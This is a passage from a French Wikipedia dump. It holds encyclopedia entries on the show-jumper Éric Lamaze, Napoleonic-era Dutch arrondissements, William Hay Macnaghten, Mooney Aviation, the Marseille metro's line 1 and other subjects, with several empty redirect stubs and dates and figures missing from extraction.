Éric Lamaze excellait au tennis avant de délaisser cette discipline pour l'équitation. Diane Dubuc, instructeur émérite, l'initie à ce sport et découvre le potentiel du jeune garçon d'à peine 10 ans. Elle conseille à sa mère d'acquérir un cheval qui permettra à son fils d'acquérir de l'expérience. Éric monte alors Aborigen, un cheval très grand pour lui et ils gagnent dans la catégorie hunter. Le « petit » cavalier se fait ensuite remarquer en montant d'autres chevaux de chasse. Suivront de nombreuses victoires en saut d'obstacles, à la suite de quoi le jeune Éric se rend aux États-Unis pour se perfectionner, avant de revenir au Canada.
Ascension dans le milieu équestre.
Il devient membre de l'équipe canadienne de saut d'obstacles en 1993, et participe à 5 éditions des Championnats du monde en 1994, 1998, 2002, 2006 et 2010.
À l'occasion de sa qualification aux Jeux olympiques d'Atlanta, il est contrôlé positif à la cocaïne et est suspendu pour 4 ans. Sa peine est ensuite diminuée à 7 mois grâce à l'intervention d'un juge canadien du Centre pour l'éthique et le sport en raison de ses antécédents familiaux. Éric Lamaze est cependant contrôlé à nouveau positif en 2000 à l'éphédrine. Banni à vie des compétitions, il replonge dans la drogue avant d'être une fois de plus contrôlé positif à la cocaïne. Le même juge qu'en 1996 lui permet de retourner à la compétition en invoquant des circonstances atténuantes.
En 2005, en Belgique, il achète son étalon Hickstead, un [KWPN] d' au garrot, avec lequel il remporte en 2007 le Grand Prix le plus doté (1 million de dollars) des compétitions de saut d'obstacles au monde, dans le cadre du Masters de Spruce Meadows à Calgary (en Alberta, Canada).
Éric Lamaze est élu cavalier de l'année 2007 au Canada. 2008 est l'année de la consécration : il devient avec Hickstead champion olympique en individuel à Pékin (Chine) et obtient la médaille d'argent par équipe. En 2010, il obtient avec son étalon KWPN la médaille de bronze en individuel aux Jeux équestres mondiaux à Lexington (États-Unis) durant l'épreuve tournante traditionnelle, à l'issue de laquelle son cheval obtient le titre de meilleur cheval de la compétition et de meilleur cheval du monde. Éric est à la tête d'une écurie de concours, la "Torrey Pines Stable", à Schomberg et aussi propriétaire de Ashland Stables a Montréal, où il coache plusieurs cavaliers, entraîne des chevaux pour le plus haut niveau et pratique le commerce de chevaux de sport. Ses autres occupations sportives sont le squash. le tennis et le golf.
Décès de Hickstead.
Victime d'une rupture de l'aorte, Hickstead, âgé de 15 ans, décède le lors de la du Grand Prix Coupe du monde de Vérone (Italie) au terme d'un parcours avec 4 points de pénalité. Le cheval s'écroule au moment de sortir de la piste, l'épreuve est interrompue puis annulée avec l'accord du public choqué et des cavaliers. Un hommage est alors rendu à l'équidé, qualifié comme « le meilleur du monde » de son vivant.
Durement affecté par la perte de sa meilleure monture, Éric Lamaze songe à se retirer définitivement de la compétition.
Après Hickstead.
Les 2, 3 et au Gucci Masters, Éric Lamaze fait son retour en Europe et dispute notamment la finale Rolex IJRC Top ten avec Coriana Van Klapscheut, avec qui il termine second, derrière Billy Twomey, ainsi que le barrage du Grand Prix, au cours duquel il fait tomber une barre.
Le week-end suivant à Genève il monte Hérald (monture d'un de ses élèves) avec qui il termine deuxième du défi des champions.
Pour participer aux Jeux olympiques de Londres, il cherche un ou plusieurs chevaux ayant le niveau international et qui lui permettraient de pouvoir défendre son titre. Il se voit confier un jeune étalon hanovrien, Scendix, dont il se sépare finalement en . Il acquiert au cours du mois de , Verdi, un hongre gris KWPN (Heartbreaker x Blue) et Luikka (Luidam x Renville) jument baie AES, tous âgés de 9 ans. 
Les Jeux Olympiques de Londres ne réussiront pas au cavalier canadien qui finira 29e aux saut d'obstacles en individuel et 5e en par équipe. 
Il lui faudra attendre 2016 et les Jeux de Rio pour renouer avec un podium olympique. Il se hissera sur la troisième marche lors de l'épreuve individuelle de saut d'obstacles pour décrocher la médaille de bronze avec sa jument "Fine Lady 5". 

</doc>
<doc id="3215025" url="https://fr.wikipedia.org/wiki?curid=3215025" title="Au Bonheur des Mômes">
Au Bonheur des Mômes



</doc>
<doc id="3215027" url="https://fr.wikipedia.org/wiki?curid=3215027" title="Arrondissement de Middelbourg">
Arrondissement de Middelbourg

L'arrondissement de Middelbourg est une ancienne subdivision administrative du département des Bouches-de-l'Escaut créée le et supprimée le .
Composition.
Il comprenait les cantons de Flessingue, Middelbourg et Veere.

</doc>
<doc id="3215028" url="https://fr.wikipedia.org/wiki?curid=3215028" title="Thames-Coromandel District">
Thames-Coromandel District



</doc>
<doc id="3215029" url="https://fr.wikipedia.org/wiki?curid=3215029" title="Thames-Coromandel">
Thames-Coromandel



</doc>
<doc id="3215032" url="https://fr.wikipedia.org/wiki?curid=3215032" title="Robert D. Murphy">
Robert D. Murphy



</doc>
<doc id="3215034" url="https://fr.wikipedia.org/wiki?curid=3215034" title="Pour la république sociale">
Pour la république sociale



</doc>
<doc id="3215036" url="https://fr.wikipedia.org/wiki?curid=3215036" title="Arrondissement de Goes">
Arrondissement de Goes

L'arrondissement de Goes est une ancienne subdivision administrative française du département des Bouches-de-l'Escaut créée en 1810 et supprimée en 1814.
Historique.
Le département des Bouches-de-l'Escaut est créé par décret du et l'arrondissement de Goes est officiellement créé à cette occasion.
 fils et de Lommessen en sont successivement sous-préfets,
L'ensemble des unités administratives françaises de la Hollande est officiellement supprimé par le traité de Paris en mai 1814.
L'arrondissement correspond à la partie de la province néerlandaise actuelle de la Zélande située essentiellement sur la presqu'île Beveland-du-Sud (sauf Kortgene, en Beveland-du-Nord).
Composition.
L'arrondissement comprenait les cantons de Goes, Heinkenszand, Kortgene et Kruiningen.

</doc>
<doc id="3215037" url="https://fr.wikipedia.org/wiki?curid=3215037" title="Parc du W">
Parc du W



</doc>
<doc id="3215038" url="https://fr.wikipedia.org/wiki?curid=3215038" title="Gode-ceinture">
Gode-ceinture



</doc>
<doc id="3215044" url="https://fr.wikipedia.org/wiki?curid=3215044" title="Arrondissement de Zierikzee">
Arrondissement de Zierikzee

L'arrondissement de Zierikzee est une ancienne subdivision administrative française du département des Bouches-de-l'Escaut créée le et supprimée le .
Composition.
Il comprenait les cantons de Brouwershaven, Tholen et Zierikzee.

</doc>
<doc id="3215047" url="https://fr.wikipedia.org/wiki?curid=3215047" title="Arrondissement de Zierickzée">
Arrondissement de Zierickzée



</doc>
<doc id="3215049" url="https://fr.wikipedia.org/wiki?curid=3215049" title="William Hay Macnaghten">
William Hay Macnaghten

William Hay Macnaghten, né le à Fort William (Calcutta) et mort (assassiné) le à Kaboul (Afghanistan), Macnaghten, est administrateur britannique des Indes.
Biographie.
Enfance et début de carrière.
William Hay Macnaghten est le fils puîné de Francis Macnaghten (1763-1843) de Dundarave, Antrim, et de Letitia, fille aînée de sir William Dunkin de Clogher, juge à la cour suprême de Calcutta. Son père est adoubé alors qu'il est nommé à la cour suprême de Madras en 1809. Il est ensuite affecté à la cour suprême de Calcutta en 1815 avant de prendre sa retraite en 1825.
Après des études en Angleterre, William revint aux Indes en 1809 comme cadet de cavalerie. Il étudia alors les langues locales et apprit le persan, l'hindi, le tamoul, le télougou, le kannara et le marathi. Lors de son affectation en juin 1811 au de cavalerie de Hyderabad, il fit la rencontre de Henry Russell qui l'initia à la diplomatie indienne.
En , il quitta l'armée et devint en 1816 membre de l'administration civile du Bengale. Il se fit alors remarquer par son don des langues et par la publication de deux ouvrages juridiques de références : "Principles and Precedents of Mohummudan Law" (1825) et "Principles and Precedents of Hindu Law" (1828-1829). Ces livres constituent un important ajout au travail d'adaptation des règles coutumières et lois indiennes aux principes législatifs anglais et furent utilisés comme références par plusieurs générations de juges.
La première guerre anglo-afghane.
La carrière de Macnaghten connut un tournant en quand le gouverneur général des Indes, lord William Bentinck, en fit un de ses secrétaires. Son successeur, George Eden, Auckland, lui accordait une grande confiance, et Macnaghten commença à élaborer des plans pour l'Afghanistan. La succession du chef des Sikhs, Ranjît Singh, s'annonçant difficile, il pensait qu'il fallait prendre le contrôle de l'Afghanistan pour contrebalancer l'influence des Sikhs et s'en servir de tampon contre la Russie. En outre, l'émir d'Afghanistan, Dost Mohammad Khan, avait semblé prêter une oreille complaisante aux offres d'alliance émanant de la Russie, attitude que son rejet de l'ultimatum de lord Auckland semblait confirmer. Macnaghten proposa donc de renverser Dost Mohammad Khan et d'installer à sa place Shah Shuja, prétendant alors exilé à Ludhiana. Ce plan fut accepté par lord Auckland et par lord Palmerston à Londres, et Macnaghten, anobli pour l'occasion, fut désigné comme émissaire auprès de Shah Shuja. Alexander Burnes, bien que partisan du maintien de Dost Mohammad Khan au pouvoir, devenait son adjoint, et le lieutenant Eldred Pottinger un de ses assistants. Ainsi commença la première guerre anglo-afghane.
Les troupes anglaises se mirent en route en . Kaboul fut prise le , et, deux semaines plus tard, Shah Shuja était installé sur le trône. Le Dost Mohammad Khan était fait prisonnier.
Au printemps 1840, Macnaghten voit arriver le capitaine Arthur Conolly, envoyé auprès de lui pour explorer les possibilités d'une poussée vers Balkh, afin de soumettre à l'autorité de Shah Shuja les tribus querelleuses entre Kaboul et Balkh. Apprenant l'échec des Russes de Vassili Perovski dans leur expédition vers Khiva, Macnaghten y voit une occasion à saisir, et envoie Conolly dans cette direction.
Après de bons débuts, la situation des Britanniques à Kaboul se dégrada, à la fois du point de vue militaire - les troupes étant harcelées par de brèves attaques - et financier. De plus, Shah Shuja se montrait peu habile et impopulaire. Dans un premier temps, les Britanniques ne prirent pas garde à la situation et William Hay Macnaghten fut récompensé pour son action par l'attribution en du titre de baronnet, puis le par sa nomination comme gouverneur de Bombay.
La situation dégénéra le lorsque les Afghans lancèrent une révolte générale à Kaboul. La garnison britannique, dont le commandant, le major-général Elphinstone était cloué au lit et où les principaux officiers étaient en conflit, ne réussit pas à faire face. Alexander Burnes, résident anglais qui avait rang de colonel, fut tué et les troupes britanniques durent se réfugier dans la citadelle. William Hay Macnaghten négocia alors un retrait total des troupes anglaises d'Afghanistan. Mais ayant perdu la confiance de ses interlocuteurs, il fut tué le par Wazir Akbar Khan, fils de Dost Mohammad Khan, lors d'une entrevue. Les troupes britanniques se replièrent alors d'Afghanistan et furent massacrées au cours de leur retraite, en , lors de la bataille de Gandamak.

</doc>
<doc id="3215051" url="https://fr.wikipedia.org/wiki?curid=3215051" title="Arnold Müller">
Arnold Müller

Arnold Müller, né le à Bachs et décédé le , est un vétérinaire et homme politique suisse. Il a été conseiller national pour les Verts.
Biographie.
Arnold Müller est professeur de médecine vétérinaire à l'Université de Zurich où il se bat pour la protection des animaux et, plus particulièrement, pour une utilisation raisonnée des animaux en laboratoire. Il combat l'élevage des poules en batterie . Il est également membre du comité central de la Société suisse de protection des animaux.
Lors des élections fédérales de 1983, Arnold Müller est le premier écologiste zurichois à être élu au Conseil national, la chambre basse de l'Assemblée fédérale suisse. En 1986, il rejoint, au Conseil National, le groupe de l'Alliance des Indépendants, mais reste membre des Verts zurichois. Il ne se représente pas aux élections fédérales suivantes, en 1987.
Arnold Müller est également considéré comme le père de l'Initiative de Rothenthurm. Cette initiative populaire, qui a été acceptée par le peuple et les cantons suisses le 6 décembre 1987, a permis de protéger les marais en Suisse.

</doc>
<doc id="3215054" url="https://fr.wikipedia.org/wiki?curid=3215054" title="Ondes hertzienne">
Ondes hertzienne



</doc>
<doc id="3215055" url="https://fr.wikipedia.org/wiki?curid=3215055" title="Josef von Báky">
Josef von Báky

Josef von Báky, né le à Zobor (Autriche-Hongrie) et mort le à Munich, est un réalisateur hongrois.
Né sujet austro-hongrois, il a fait toute sa carrière de cinéaste en Allemagne, d'abord sous la république de Weimar, ensuite sous le Troisième Reich, enfin en Allemagne de l'Ouest.
Il est resté célèbre pour son adaptation des "Aventures fantastiques du baron Munchhausen" (1943), d'après le roman de Carl Leberecht Immermann.

</doc>
<doc id="3215056" url="https://fr.wikipedia.org/wiki?curid=3215056" title="Les Aventures du Baron de Muenchhausen">
Les Aventures du Baron de Muenchhausen



</doc>
<doc id="3215057" url="https://fr.wikipedia.org/wiki?curid=3215057" title="Josef Von Baky">
Josef Von Baky



</doc>
<doc id="3215059" url="https://fr.wikipedia.org/wiki?curid=3215059" title="Figuration Libre">
Figuration Libre



</doc>
<doc id="3215061" url="https://fr.wikipedia.org/wiki?curid=3215061" title="Arrondissement de La Haye">
Arrondissement de La Haye

L'arrondissement de La Haye (en néerlandais : ) était une subdivision administrative française du département des Bouches-de-la-Meuse créée le et supprimée le .
Géographie.
Cantons.
L'arrondissement de La Haye comprenait les cantons suivants : 

</doc>
<doc id="3215063" url="https://fr.wikipedia.org/wiki?curid=3215063" title="La Semaine de l'Allier">
La Semaine de l'Allier

La Semaine de l'Allier est un journal hebdomadaire consacré au département de l'Allier, fondé en 2005 à Moulins.
Il est dirigé par Jean de Charon, homme de médias qui a notamment été à la tête du groupe de presse Impact Médecins ou encore de doctissimo.fr, sur un territoire constitué de trois pôles économiques et culturels très autonomes que sont Moulins, Vichy et Montluçon.
Le tirage de cet hebdomadaire était de exemplaires chaque semaine en 2008, selon l'OJD. "La Semaine de l'Allier" a obtenu l'Étoile de l'OJD 2012 de la meilleure progression de la presse hebdomadaire régionale. L'entreprise a été une nouvelle fois distinguée en par l'OJD qui lui a décerné l'Étoile 2014 de la constance dans le succès, saluant la progression des ventes du journal sur les cinq dernières années (2009-2013).
Chaque année, le journal organise l'élection des « Bourbonnais de l'année ». Une vingtaine de personnalités sont pré-sélectionnées et soumises au vote des lecteurs et internautes. C'est une manière de mettre en avant les hommes et les femmes qui se mobilisent pour ce territoire.
Depuis 2008, "La Semaine de l'Allier" dispose également d'un site Internet d'informations locales : lasemainedelallier.fr.
Le journal emploie une dizaine de salariés dans le département et s'appuie sur un réseau d'une vingtaine de correspondants.

</doc>
<doc id="3215069" url="https://fr.wikipedia.org/wiki?curid=3215069" title="Mooney Aviation Company">
Mooney Aviation Company

Mooney est un constructeur américain d'aviation générale qui a fait faillite plusieurs fois mais qui a également réussi à renaître grâce à la qualité de ses avions et à des repreneurs successifs. Mooney a produit avions depuis sa création en 1929. Ses avions sont reconnaissables à la dérive dont le bord d'attaque est vertical. Les propriétaires de Mooney sont en général de véritables aficionados qui se dénomment des "Mooniacs".
Histoire.
La société a été créée en 1929 par Albert et Arthur Mooney, fit faillite dès 1930 puis fut recréée en 1948 dans le Kansas puis déménagée pour des raisons de place en 1953 à Kerrville au Texas.
Le premier avion fut conçu pour plaire aux aviateurs américains démobilisés. Dès le début, les Mooney ont été reconnus comme de véritables chasseurs civils. Aujourd'hui encore, le Mooney M20TN Acclaim type S est l'avion monomoteur à pistons le plus rapide. Il croise à d'altitude () à () avec un moteur de . Il emporte 4 personnes à son bord et son prix est aux alentours de .
En 1984, la société est reprise par un groupe d'investisseurs de Minneapolis et une équipe dirigeante composée par Armand Rivard et Alexandre Couvelaire, un distributeur français. Roy LoPresti en devient le Président mais quitte la société en 1985, laissant en plan son nouvel avion (le 301) dont Socata fera le TBM 700. Mooney se concentre alors sous la houlette de ses nouveaux patrons sur la série des M20 et en renouvelle fortement la gamme.
En , Mooney a annoncé une collaboration avec Rolls-Royce pour produire un avion avec une turbine de 350 à à l'horizon 2011. Dans le même temps, la production a été réduite de 8 à 5 avions par mois et plusieurs dizaines d'employés ont été licenciés. En , la société annonce l'arrêt de sa production et se sépare des deux tiers de ses salariés restants. Le support client est néanmoins maintenu. Il restait en décembre environ 50 salariés et 25 avions invendus.
En , après 18 mois sans aucune production d'avion, la totalité des avions fabriqués ont été vendus et l'entreprise annonce qu'elle envisage d'arrêter la production dans un avenir proche, en attendant que le marché retrouve sa dynamique. Le , Mooney débutait une nouvelle période de licenciement, envisageant de passer de 53 employés à moins de 10 aux environs du . Le personnel restant est employé à l'entretien des locaux, tenant à jour les certificats de production et de type et fournissant un support technique en matière de pièces détachées pour les nombreux propriétaires dans le monde. L'entreprise a maintenu les négociations avec de potentiels investisseurs pour pouvoir reprendre la production. Barry Hodkin, chef responsable financier chez Mooney a déclaré « Nous ne fermons pas complètement, cependant nous ne pouvons pas nous permettre de continuer à subventionner l'entreprise comme nous l'avons fait ces derniers temps, cela fait 18 mois que nous sommes en pourparlers avec des investisseurs potentiels et nous continuerons de travailler avec eux, si les choses changent, alors le nombre d'employés pourrait se revoir à la hausse. »
À la suite de l'arrivée d'un nouvel investisseur (Soaring America Corporation), la société a repris la production de la série des Ovation et des Acclaim en 2014 avec présentation au salon Airventure d'Oshkosh.
En , un premier Acclaim est produit en Chine.
Deux nouveaux modèles ont été annoncés le . Les M10T et M10J auraient été des biplaces à motorisation diesel mais en , Mooney annonce le retrait du programme au profit de la modernisation de la nouvelle gamme M20 qui a été certifiée le . Néanmoins, le PDG nommé un an auparavant est démis de ses fonctions en .
Mooney n'a vendu que 14 avions en 2018 et seulement 4 au premier semestre 2019. Le , la société a fermé ses portes et congédié tous les employés. Le suivant, la DRH de la société annonce une reprise d'activité et des négociations en cours avec un investisseur.
Le 2 septembre 2020, un groupe de pilotes et de propriétaires mené par Jonny Pollack reprend 80 % des parts de la société ainsi que sa gestion opérationnelle. Il annonce mettre sa priorité dans la disponibilité des pièces détachées pour les en service puis travailler à une reprise de la production et élaborer quelques idées pour moderniser la flotte.

</doc>
<doc id="3215072" url="https://fr.wikipedia.org/wiki?curid=3215072" title="Lazzaro Baldi">
Lazzaro Baldi

Lazzaro Baldi, né en 1624 à Pistoia en Toscane, mort en 1703 à Rome, est un graveur et un peintre italien baroque actif au et début du .
Biographie.
Lazzaro Baldi est un peintre italien de la période baroque, actif principalement à Rome, il a fait partie du grand atelier de Pietro da Cortona en même temps que Ciro Ferri. Il est devenu adepte de la technique de la fresque. Il a peint un "David et Goliath" pour Alexandre VII au Palais du Quirinal. Il est également influencé par Pier Francesco Mola et Gaspard Dughet avec lesquels il a collaboré. 
Il a également peint des fresques (1658) pour l'oratoire San Giovanni in Oleo, ainsi qu'une fresque de "Saint Jean le théologien à Patmos" (1660 - 1665) pour l'Archibasilique Saint-Jean-de-Latran. Il a également peint un retable du "Martyre de saint Lazare " pour l'église des Santi Luca e Martine. 
Vers 1660, sa peinture a évolué du style baroque influencé par Pierre de Cortone vers le classicisme issu de Carlo Maratta avec des compositions à dominante de blanc ou de grands plans colorés. Les fresques peintes en 1671 à Santa Maria Sopra Minerva montrent ce changement.
En 1679, il est devenu directeur ("principe") de l'Accademia di San Luca à Rome. Il a également travaillé à Camerino, Pistoia et Pérouse où il a peint "la Descente du Saint-Esprit", (église du S. Spirito). L'un de ses plus fidèles disciples est Giovanni Battista Lenardi.
À la fin de sa vie, à partir de 1690, il est animé d'une ferveur religieuse. Il abandonne la décoration pour réaliser des œuvres pieuses dans la veine dramatique de Giovanni Lanfranco. Les formes se raidissent et les couleurs s'assombrissent.
Comme graveur, Baldi est connu pour une plaque sur la conversion de saint Paul.

</doc>
<doc id="3215073" url="https://fr.wikipedia.org/wiki?curid=3215073" title="Fort-Lévêque">
Fort-Lévêque



</doc>
<doc id="3215074" url="https://fr.wikipedia.org/wiki?curid=3215074" title="Église Saint-Gilles d'Étampes">
Église Saint-Gilles d'Étampes

L'église Saint-Gilles est une église paroissiale de culte catholique, dédiée à saint Gilles, située dans la commune française d'Étampes et le département de l'Essonne.
Situation.
L'église Saint-Gilles est implantée au centre de la place du même nom à quelques centaines de mètres du centre-ville d'Étampes, en bordure de l'ancien tracé de la route nationale 20 de Paris à Orléans.
Historique.
Une première église est construite en 1123 lors de la création de la place accueillant le marché au blé institué par Louis VI le Gros, afin d'établir un lien entre les parties nord et sud de la commune d’Étampes.
Au , une nouvelle église est construite dont subsistent le vaisseau, les piliers d'entrée et les piles du transept. À la fin de ce siècle sont ajoutés le clocher qui supporte la tour de croisée dans un style roman. Au , le chœur est reconstruit avec un chevet plat dans un style gothique flamboyant. En 1547 sont ajoutés les collatéraux et chapelles latérales, les clefs de voûte sculptées.
Le , le quartier est bombardé par les alliés. Une grande partie de l'église doit être reconstruite.
Le , l'église est classée aux monuments historiques.
Description.
L'église est construite en grès et calcaire sur un plan en croix latine à trois vaisseaux sur un axe nord-est sud-ouest. Le clocher et la partie basse de la nef ont été construits au dans un style roman. Au furent ajoutés le chevet, le chœur et les bras du transept dans un style gothique flamboyant avec des voûtes à croisée d'ogives quadripartites. En 1596 furent ajoutées des fresques sur le berceau de la nef représentant sur un fond semé de fleurs de lys couronnées et d'initiales « H » et « L », le roi Louis IX sous les traits d'Henri III, Saint Michel, Saint Jean-Baptiste, Saint Vincent, Saint Jean et une croix de Malte. Les toits et le clocher sont fermés par des bâtières.
La cloche dite "Marie-Flore" fut fondue en bronze en 1850, les fonts baptismaux en fonte dorée complètent le riche mobilier de l'église.
Annexes.
Bibliographie.
Par ordre chronologique de publication :

</doc>
<doc id="3215075" url="https://fr.wikipedia.org/wiki?curid=3215075" title="Arrondissement de Brielle">
Arrondissement de Brielle

L'arrondissement de Brielle (en néerlandais : "Arrondissement Den Briel" ou "Arrondissement Brielle") était une subdivision administrative française du département des Bouches-de-la-Meuse du Premier Empire créée le et supprimée le .
En 1813, l'arrondissement comptait , dont à Brielle, à Gorée et à Sommelsdyck.
Géographie.
Cantons.
L'arrondissement de Brielle comprenait les cantons suivants : 

</doc>
<doc id="3215077" url="https://fr.wikipedia.org/wiki?curid=3215077" title="District de Hauraki">
District de Hauraki

Le district de Hauraki est situé dans l'île du Nord de la Nouvelle-Zélande, au sud-est d'Auckland.
Le district s'étend sur km. Il va du coin sud-ouest du Firth of Thames jusqu'à un peu avant la localité de Te Aroha au sud-est (cette ville ne fait pas partie du district). Il s'étend également à l'est jusqu'à la côte de Bay of Plenty, occupant la partie sud de la péninsule Coromandel. Le reste de cette péninsule fait partie du district de Thames-Coromandel. 
On y trouve la gorge Karangahake, Whiritoa, les , et Waihi, ancienne ville minière.
Selon le recensement de 2006 en Nouvelle-Zélande, il a une population de habitants, dont à Paeroa et à Waihi. Le conseil du district est situé à Paeroa.

</doc>
<doc id="3215078" url="https://fr.wikipedia.org/wiki?curid=3215078" title="Direttissima">
Direttissima



</doc>
<doc id="3215079" url="https://fr.wikipedia.org/wiki?curid=3215079" title="Siddhartha Gautama dans l'hindouisme">
Siddhartha Gautama dans l'hindouisme

 
Certaines branches de l'hindouisme l'ont intégré dans leur panthéon de divinités Siddhārtha Gautama, dans le "Bhāgavata Purāna" il est considéré comme le neuvième avatar de Vishnou. Pour des auteurs comme Vasundhara Filliozat, il existe deux "Buddhas" différents qui ont vécus à deux époques distinctes, l'un est le buddha des bouddhistes et l'autre, l'avatar de Vishnou prêche la non-violence par ruse. Ils sont souvent confondus.
Dans les Puranas, il est le vingt-quatrième des vingt-cinq avatars, préfigurant une prochaine incarnation finale mais il existe d'autres sources que les Puranas. 
Un certain nombre de traditions hindoues parlent de Gautama Bouddha comme du plus récent des dix avatars principaux, connus sous le nom de "Dashavatara" (Dix Incarnations de Dieu).
Statut de Gautama Bouddha dans l'hindouisme.
Dans la section "Dashavatara-stotra" de son "Gita-Govinda", le célèbre poète vaïshnava Jayadeva ( ap J.-C.) inclut Gautama Bouddha parmi les dix avatars principaux de Vishnou, et lui écrit une louange comme suit :
Ce point de vue qui considère Gautama Bouddha comme avatar de Vishnou a principalement promu la non-violence (ahimsa), et reste une croyance populaire parmi un certain nombre d'organisations vaishnava modernes, y compris ISKCON 
Dans l'hindouisme, on adore très facilement des avatars populaires tels Rāma ou Krishna comme Dieu Suprême, mais il est beaucoup moins commun de trouver Gautama Bouddha (avatar) adoré par les hindous de la même manière. Néanmoins, il est reconnu par certains hindous comme incarnation (« avatar » en sanskrit) de Vishnou de plein droit, et en conséquence respecté en tant que tel : dans ce cas-ci les hindous reconnaissent qu'il est la dernière des plus significatives incarnations du Seigneur Vishnou, et qu'on lui doit la fin des sacrifices d'animaux en Inde.
D'après le "Bhāgavata Purāṇa", « Vishnou prit la forme de Bouddha pour tromper les asuras. En conseillant aux démons d'abandonner les Védas, il contribua à diminuer leur pouvoir et à rétablir la suprématie des dieux ».
Il est à noter que d'autres courants hindous ne reconnaissent pas Bouddha en tant qu'avatar de Vishnou, mais Balarâma à la place.

</doc>
<doc id="3215082" url="https://fr.wikipedia.org/wiki?curid=3215082" title="Azza Besbes">
Azza Besbes

Azza Besbes (), née le à Abou Dabi, est une escrimeuse tunisienne pratiquant le sabre. Elle est la sœur des escrimeuses Sarra, Hela et Rim Besbes, ainsi que de l'escrimeur Ahmed Aziz Besbes.
Biographie.
Histoire de famille.
L'escrime est une histoire de famille pour la fratrie Besbes. En effet, leur mère Hayet Besbes (née Ben Ghazi) a été championne de Tunisie de fleuret alors que leur père Ali Besbes a été basketteur et professeur d'éducation physique. Ce dernier se met à l'escrime et développe sa carrière à Abou Dhabi où il devient un encadreur sportif. Les cinq enfants du couple sont initiés à l'escrime et tous finissent par intégrer l'équipe nationale de Tunisie.
Azza Besbes s'installe à à Paris pour progresser, conciliant ses études avec la pratique du sport. Elle intègre le Cercle d'escrime orléanais, l'un des pôles de formation du sabre français. Elle est alors invitée à participer aux stages de l'équipe de France féminine. En 2008, elle intègre le club parisien de l'US Métro. Dans ce contexte, elle fait partie d'un programme ministériel de soutien aux sportifs d'élite qui lui permet de bénéficier d'une bourse nationale. Même si elle vit en France, elle est rattachée à la Fédération tunisienne d'escrime.
Azza Besbes est ingénieure en systèmes d'information diplômée de l'ECE Paris et détentrice d'un master spécialisé en management de la performance opérationnelle et financière de l'ESCP Europe. Elle travaille en tant que consultante au sein du cabinet Ernst &amp; Young.
Carrière.
En 2006, Azza Besbes se classe douzième aux championnats du monde cadets .
En 2008, elle finit aux championnats du monde juniors. Après avoir été championne d'Afrique durant cette même année, elle participe aux Jeux olympiques d'été de 2008, dans la catégorie du sabre individuel. Le 9 août, en battant successivement en seizièmes de finale la Française Léonore Perrus (huitième mondiale) et en huitièmes de finale la Canadienne , Azza Besbes devient, à l'âge de 17 ans, la première escrimeuse africaine et arabe à atteindre les quarts de finale d'un tournoi individuel olympique d'escrime. En quarts de finale, elle bouscule l'Américaine et numéro un mondiale, Rebecca Ward, mais celle-ci revient à la marque et finit par la devancer (). Parvenant à égaliser à la fin du combat (), Besbes est à une touche seulement des demi-finales et du podium olympique, lorsque la quinzième touche est attribuée à Ward. Elle termine finalement à la .
En 2009, elle remporte la troisième place au sabre féminin individuel à l'occasion de la coupe du monde junior tenue à Dormagen, devenant la première sabreuse tunisienne, africaine et arabe à remporter une médaille dans une telle compétition. Aux championnats du monde 2009 seniors organisés la même année à Antalya, elle termine au sabre féminin individuel et au sabre féminin par équipes. Aux Jeux méditerranéens de 2009, elle obtient la cinquième place en individuel.
Début 2010, elle remporte une médaille de bronze en sabre féminin à l'occasion de la coupe du monde junior organisée à Budapest et une autre à Dourdan. Au mois de mars, elle remporte une médaille de bronze en individuel et la quatrième place par équipe aux championnats du monde junior tenus à Bakou.
Alors qu'elle a rejoint le cercle d'escrime de Monastir , elle remporte la médaille de bronze en individuel aux Jeux méditerranéens de 2013.
Sacrée championne d'Afrique en 2017, elle finit deuxième aux championnats du monde organisés à Leipzig, .
L'année suivante, elle obtient la médaille d'or en individuel aux Jeux méditerranéens de 2018. Le , elle met un terme à sa carrière sportive à la suite d'un bras de fer qui l'oppose au ministère de la Jeunesse et des Sports tunisien : celle-ci a indiqué se trouver dans une situation financière l'empêchant de payer ses dettes et de se préparer alors que le ministère a publié les sommes touchées par l'escrimeuse en 2017-2018. Besbes a par ailleurs critiqué les termes du nouveau contrat que lui a proposé le ministère. Trois jours plus tard, le groupe Zouari annonce qu'il devient le sponsor officiel de l'escrimeuse.

</doc>
<doc id="3215086" url="https://fr.wikipedia.org/wiki?curid=3215086" title="Hauraki District">
Hauraki District



</doc>
<doc id="3215087" url="https://fr.wikipedia.org/wiki?curid=3215087" title="Lokoum">
Lokoum



</doc>
<doc id="3215089" url="https://fr.wikipedia.org/wiki?curid=3215089" title="Paris Inter">
Paris Inter



</doc>
<doc id="3215090" url="https://fr.wikipedia.org/wiki?curid=3215090" title="Pierre-Marie Hériaud">
Pierre-Marie Hériaud

Pierre-Marie Hériaud, né en 1962 à Nantes, est un journaliste français.
Rédacteur en chef adjoint du quotidien Presse-Océan entre et septembre 2023, il a collaboré entre 1982 et 2004 à de nombreuses publications, notamment Le Nouveau Détective, Aujourd'hui en France-Le Parisien (sous le pseudonyme d'Antoine Martin) et Le Journal du dimanche (sous le pseudonyme d'Eric Sébastien) sans oublier le journal du Football Club de Nantes, Sportmania.
Depuis 2001, il intervient régulièrement sur des formations en entreprises et devant les étudiants d'écoles supérieures (Audencia, Sup de Com, ISEG...) sur les techniques de rédaction journalistique, la prise de parole en. public, la conception et l'animation d'un support d'information. Il conseille également entreprises et organismes publics sur le contenu de leurs journaux d'entreprise et l'organisation de leur équipe rédactionnelle.

</doc>
<doc id="3215091" url="https://fr.wikipedia.org/wiki?curid=3215091" title="Radio-Luxembourg">
Radio-Luxembourg



</doc>
<doc id="3215093" url="https://fr.wikipedia.org/wiki?curid=3215093" title="Great Scott !">
Great Scott !



</doc>
<doc id="3215095" url="https://fr.wikipedia.org/wiki?curid=3215095" title="E.g">
E.g



</doc>
<doc id="3215097" url="https://fr.wikipedia.org/wiki?curid=3215097" title="Ligne 1 du métro de Marseille">
Ligne 1 du métro de Marseille

La ligne 1 du métro de Marseille est une des deux lignes du réseau métropolitain de Marseille. Ouverte en 1977 et étendue en 1978, 1992 et 2010, elle compte 18 stations entre La Rose et La Fourragère.
D’une longueur de , la ligne forme une boucle desservant le nord-est de la ville (la Rose, les Chartreux), le centre-ville (Cinq-Avenues, Vieux-Port, Préfecture) puis les quartiers est (La Blancarde, Saint-Barnabé). Elle est en correspondance avec la ligne 2 à Saint-Charles et Castellane.
Historique.
Construction.
Le tracé de la ligne 1 correspond sensiblement au plan initialement proposé en 1969 d'une entre la Rose et la gare de la Blancarde. Le trajet définitif est arrêté en 1978 mais l'État, qui finance le projet à hauteur de 30 %, étale le versement de sa participation ce qui oblige à réaliser la ligne en plusieurs étapes. 
